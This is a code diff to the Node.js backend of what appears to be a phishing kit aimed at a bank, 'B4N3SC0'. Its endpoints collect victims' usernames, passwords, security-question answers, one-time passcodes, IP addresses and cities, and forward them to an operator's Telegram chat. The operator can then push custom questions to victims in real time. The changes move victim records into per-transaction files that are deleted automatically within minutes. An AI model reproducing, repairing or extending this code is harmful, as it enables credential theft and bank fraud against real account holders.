@@ -11,14 +11,42 @@ app.use(express.urlencoded({ extended: true }));
 
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
-const STATUS_FILE = './status.json';
 
-let clientes = {};
-if (fs.existsSync(STATUS_FILE)) {
-  clientes = JSON.parse(fs.readFileSync(STATUS_FILE));
+const CLIENTES_DIR = './clientes';
+if (!fs.existsSync(CLIENTES_DIR)) {
+  fs.mkdirSync(CLIENTES_DIR);
 }
-function guardarEstado() {
-  fs.writeFileSync(STATUS_FILE, JSON.stringify(clientes, null, 2));
+
+const path = require('path');
+
+// Limpieza automática cada 10 minutos: borra archivos de clientes con más de 60 minutos
+setInterval(() => {
+  const files = fs.readdirSync(CLIENTES_DIR);
+  const ahora = Date.now();
+
+  files.forEach(file => {
+    const fullPath = path.join(CLIENTES_DIR, file);
+    const stats = fs.statSync(fullPath);
+    const edadMinutos = (ahora - stats.mtimeMs) / 60000;
+
+    if (edadMinutos > 15) {
+      fs.unlinkSync(fullPath);
+      console.log(`🗑️ Eliminado: ${file} (tenía ${Math.round(edadMinutos)} minutos)`);
+    }
+  });
+}, 10 * 60 * 1000);
+
+function guardarCliente(txid, data) {
+  const ruta = `${CLIENTES_DIR}/${txid}.json`;
+  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
+}
+
+function cargarCliente(txid) {
+  const ruta = `${CLIENTES_DIR}/${txid}.json`;
+  if (fs.existsSync(ruta)) {
+    return JSON.parse(fs.readFileSync(ruta));
+  }
+  return null;
 }
 
 app.post('/enviar', async (req, res) => {
@@ -28,21 +56,23 @@ app.post('/enviar', async (req, res) => {
 🟢B4N3SC0🟢
 🆔 ID: <code>${txid}</code>
 
-📱 US4R: ${usar}
-🔐 CL4V: ${clavv}
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clavv}</code>
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
 `;
 
-  clientes[txid] = {
+  const cliente = {
     status: "esperando",
     usar,
     clavv,
     preguntas: [],
-    esperando: null
+    esperando: null,
+    ip,
+    ciudad
   };
-  guardarEstado();
+  guardarCliente(txid, cliente);
 
   const keyboard = {
     inline_keyboard: [
@@ -68,23 +98,18 @@ app.post('/enviar', async (req, res) => {
 
 app.post('/enviar2', async (req, res) => {
   const {
-    usar,
-    clavv,
-    txid,
-    pregunta1,
-    pregunta2,
-    respuesta1,
-    respuesta2,
-    ip,
-    ciudad
+    usar, clavv, txid,
+    pregunta1, pregunta2,
+    respuesta1, respuesta2,
+    ip, ciudad
   } = req.body;
 
   const mensaje = `
 ❓🔑🟢B4N3SC0🟢
 🆔 ID: <code>${txid}</code>
 
-📱 US4R: ${usar}
-🔐 CL4V: ${clavv}
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clavv}</code>
 
 ${pregunta1}❓ : ${respuesta1}
 ${pregunta2}❓ : ${respuesta2}
@@ -101,8 +126,9 @@ ${pregunta2}❓ : ${respuesta2}
     ]
   };
 
-  clientes[txid].status = "esperando";
-  guardarEstado();
+  const cliente = cargarCliente(txid) || {};
+  cliente.status = "esperando";
+  guardarCliente(txid, cliente);
 
   await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
     method: 'POST',
@@ -119,23 +145,16 @@ ${pregunta2}❓ : ${respuesta2}
 });
 
 app.post('/enviar3', async (req, res) => {
-  const {
-    usar,
-    clavv,
-    txid,
-    dinamic,
-    ip,
-    ciudad
-  } = req.body;
+  const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;
 
   const mensaje = `
 🔑🟢B4N3SC0🟢
 🆔 ID: <code>${txid}</code>
 
-📱 US4R: ${usar}
-🔐 CL4V: ${clavv}
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clavv}</code>
 
-🔑 0TP: ${dinamic}
+🔑 0TP: <code>${dinamic}</code>
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
@@ -149,8 +168,9 @@ app.post('/enviar3', async (req, res) => {
     ]
   };
 
-  clientes[txid].status = "esperando";
-  guardarEstado();
+  const cliente = cargarCliente(txid) || {};
+  cliente.status = "esperando";
+  guardarCliente(txid, cliente);
 
   await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
     method: 'POST',
@@ -173,9 +193,6 @@ app.post('/webhook', async (req, res) => {
     const commandParts = message.text.slice(1).split(' ');
     const txid = commandParts[0];
     const preguntasTexto = commandParts.slice(1).join(' ');
-    const cliente = clientes[txid];
-
-    if (!cliente) return res.sendStatus(404);
 
     const [pregunta1, pregunta2] = preguntasTexto.split('&');
 
@@ -185,25 +202,23 @@ app.post('/webhook', async (req, res) => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: message.chat.id,
-          text: `⚠️ Formato inválido. Usa:
-/${txid} ¿Pregunta1?&¿Pregunta2?`
+          text: `⚠️ Formato inválido. Usa:\n/${txid} ¿Pregunta1?&¿Pregunta2?`
         })
       });
       return res.sendStatus(200);
     }
 
+    const cliente = cargarCliente(txid) || { preguntas: [], status: 'esperando' };
     cliente.preguntas = [pregunta1.trim(), pregunta2.trim()];
     cliente.status = 'preguntas';
-    guardarEstado();
+    guardarCliente(txid, cliente);
 
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: message.chat.id,
-        text: `✅ Preguntas guardadas para ${txid}
-1️⃣ ${pregunta1.trim()}
-2️⃣ ${pregunta2.trim()}`
+        text: `✅ Preguntas guardadas para ${txid}\n1️⃣ ${pregunta1.trim()}\n2️⃣ ${pregunta2.trim()}`
       })
     });
 
@@ -215,9 +230,10 @@ app.post('/webhook', async (req, res) => {
     const partes = callback.data.split(":");
     const accion = partes[0];
     const txid = partes[1];
-    const cliente = clientes[txid];
 
-    if (!cliente) return res.sendStatus(404);
+    const cliente = cargarCliente(txid) || { status: 'esperando' };
+    cliente.status = accion;
+    guardarCliente(txid, cliente);
 
     if (accion === 'preguntas_menu') {
       await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -225,16 +241,10 @@ app.post('/webhook', async (req, res) => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: callback.message.chat.id,
-          text: `✍️ Escribe las 2 preguntas personalizadas para ${txid} 
-Ej: /txid ¿Dónde naciste?&¿Cuál es tu color favorito?`
+          text: `✍️ Escribe las 2 preguntas personalizadas para ${txid}\nEj: /${txid} ¿Dónde naciste?&¿Cuál es tu color favorito?`
         })
       });
-
-      return res.sendStatus(200);
     }
-
-    cliente.status = accion;
-    guardarEstado();
 
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
       method: 'POST',
@@ -253,7 +263,7 @@ Ej: /txid ¿Dónde naciste?&¿Cuál es tu color favorito?`
 
 app.get('/sendStatus.php', (req, res) => {
   const txid = req.query.txid;
-  const cliente = clientes[txid] || { status: 'esperando', preguntas: [] };
+  const cliente = cargarCliente(txid) || { status: 'esperando', preguntas: [] };
   res.json({ status: cliente.status, preguntas: cliente.preguntas });
 });
 
